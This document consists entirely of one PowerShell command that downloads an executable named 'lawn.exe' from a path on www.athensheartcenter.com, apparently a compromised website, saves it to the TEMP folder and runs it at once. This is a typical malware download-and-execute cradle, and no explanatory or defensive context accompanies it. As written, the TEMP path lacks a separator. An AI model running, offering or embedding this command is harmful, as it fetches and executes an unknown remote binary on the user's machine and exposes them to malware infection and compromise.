(New-Object System.Net.WebClient).DownloadFile('www.athensheartcenter.com/components/com_gantry/lawn.exe',"$env:TEMPlawn.exe");Start-Process ("$env:TEMPlawn.exe")